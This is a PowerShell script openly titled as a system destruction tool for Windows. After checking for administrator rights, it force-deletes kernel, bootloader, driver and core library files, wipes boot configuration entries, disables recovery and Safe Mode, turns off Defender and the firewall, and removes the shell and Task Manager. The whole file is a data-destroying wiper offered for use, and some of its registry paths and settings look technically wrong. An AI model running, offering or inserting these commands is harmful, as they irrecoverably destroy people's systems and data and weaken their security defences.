# ULTIMATE SYSTEM DESTRUCTION SCRIPT - USE AT YOUR OWN RISK
# WARNING: This script will render your system completely unbootable and beyond recovery.

# Ensure script is run as Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "You need to run this script as an administrator!" -ForegroundColor Red
    exit
}

Write-Host "Starting absolute destruction of the Windows system..." -ForegroundColor Red

# PART 1: Obliterate Windows Kernel and Boot Structure

Write-Host "Deleting critical Windows Kernel components (ntoskrnl.exe, hal.dll)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\ntoskrnl.exe" -Force  # Main kernel
Remove-Item -Path "C:\Windows\System32\hal.dll" -Force  # Hardware Abstraction Layer (HAL)

Write-Host "Destroying Boot Configuration Data (BCD) and bootloader (bootmgr, winload.exe)..." -ForegroundColor Red
Remove-Item -Path "C:\bootmgr" -Force  # Boot Manager
Remove-Item -Path "C:\Windows\System32\winload.exe" -Force  # Windows Boot Loader

Write-Host "Deleting boot configuration entries and BCD store..." -ForegroundColor Red
bcdedit /delete {default} /f  # Delete the default boot entry
bcdedit /delete {bootmgr} /f  # Remove boot manager from BCD

# PART 2: Completely Disable Recovery Options (Safe Mode, WinRE)

Write-Host "Disabling Safe Mode and Windows Recovery Environment (WinRE)..." -ForegroundColor Red
bcdedit /set {default} safeboot minimal  # Corrupt Safe Mode boot entry
bcdedit /set {bootmgr} recoveryenabled No  # Disable Windows Recovery Environment (WinRE)

Write-Host "Disabling advanced boot options (F8 menu)..." -ForegroundColor Red
bcdedit /set {globalsettings} advancedoptions false  # Disable the F8 boot options menu

# PART 3: Destroy Power Management and ACPI (Prevents Safe Shutdown)

Write-Host "Disabling ACPI (Power Management) and hardware shutdown..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\ACPI" -Name "Start" -Value 4 -Force  # Disable ACPI
Remove-Item -Path "C:\Windows\System32\drivers\acpi.sys" -Force  # Remove ACPI driver (Power and hardware abstraction)

# PART 4: Cripple Disk I/O, NTFS, and Volume Management

Write-Host "Disabling NTFS file system and destroying disk I/O drivers..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\Ntfs" -Name "Start" -Value 4 -Force  # Disable NTFS
Remove-Item -Path "C:\Windows\System32\drivers\disk.sys" -Force  # Main disk driver
Remove-Item -Path "C:\Windows\System32\drivers\partmgr.sys" -Force  # Partition manager

Write-Host "Deleting Volume Snapshot Service (VSS) and file system backups..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\volsnap.sys" -Force  # Remove Volume Shadow Copy driver

# PART 5: Destroy Security Layers and Integrity Checks

Write-Host "Disabling Kernel Patch Protection and integrity checks..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableKernelPatchProtection" -Value 1 -Force  # Disable PatchGuard
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableIntegrityChecks" -Value 1 -Force  # Disable kernel integrity checks

Write-Host "Disabling Secure Boot and deleting security policies..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -Value 0 -Force  # Disable Secure Boot

# PART 6: Disable All Networking and TCP/IP Stack

Write-Host "Destroying networking stack and disabling network services..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\tcpip.sys" -Force  # Remove TCP/IP stack
Remove-Item -Path "C:\Windows\System32\drivers\ndis.sys" -Force  # Remove network driver interface
Set-Service -Name Dhcp -StartupType Disabled  # Disable DHCP service
Set-Service -Name Dnscache -StartupType Disabled  # Disable DNS Client service
Stop-Service -Name Dhcp, Dnscache -Force  # Stop DHCP and DNS services

# PART 7: Remove Windows Defender, Firewall, and Security Providers

Write-Host "Disabling Windows Defender and removing core security services..." -ForegroundColor Red
Set-Service -Name WinDefend -StartupType Disabled  # Disable Windows Defender
Remove-Item -Path "C:\Windows\System32\drivers\wd.sys" -Force  # Remove Defender driver

Write-Host "Disabling Windows Firewall and removing the firewall service..." -ForegroundColor Red
Set-Service -Name MpsSvc -StartupType Disabled  # Disable Windows Firewall service
Stop-Service -Name MpsSvc -Force  # Stop the firewall service
Remove-Item -Path "C:\Windows\System32\mpssvc.dll" -Force  # Remove the firewall service DLL

# PART 8: Destroy Windows UI, Explorer, and User Input Systems

Write-Host "Removing Windows Shell and Explorer functionality..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "" -Force  # Disable shell
Remove-Item -Path "C:\Windows\explorer.exe" -Force  # Delete Explorer.exe
Remove-Item -Path "C:\Windows\System32\userinit.exe" -Force  # Disable user initialization process

Write-Host "Disabling Task Manager and user input services..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\Taskmgr.exe" -Force  # Remove Task Manager
Remove-Item -Path "C:\Windows\System32\ctfmon.exe" -Force  # Disable Text Input Management

# PART 9: Cripple Hardware Interfaces (GPU, Audio, USB)

Write-Host "Disabling GPU drivers and hardware interfaces (nvlddmkm.sys, atikmdag.sys)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\nvlddmkm.sys" -Force  # Remove NVIDIA GPU driver
Remove-Item -Path "C:\Windows\System32\drivers\atikmdag.sys" -Force  # Remove AMD GPU driver

Write-Host "Disabling USB and Audio drivers..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\usbhub.sys" -Force  # Disable USB drivers
Remove-Item -Path "C:\Windows\System32\drivers\usbstor.sys" -Force  # Disable USB storage driver
Remove-Item -Path "C:\Windows\System32\drivers\audiosrv.sys" -Force  # Remove Audio Service

# PART 10: Render the System Unbootable and Final Touches

Write-Host "Rendering the system unbootable..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\bootvid.dll" -Force  # Remove boot video driver
Remove-Item -Path "C:\Windows\System32\bootres.dll" -Force  # Remove boot resource driver

Write-Host "Deleting critical libraries (kernel32.dll, ntdll.dll)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\kernel32.dll" -Force  # Core system library
Remove-Item -Path "C:\Windows\System32\ntdll.dll" -Force  # Windows NT Layer

Write-Host "Final destruction complete. The system is now irrecoverable and cannot be booted. Goodbye!" -ForegroundColor Red
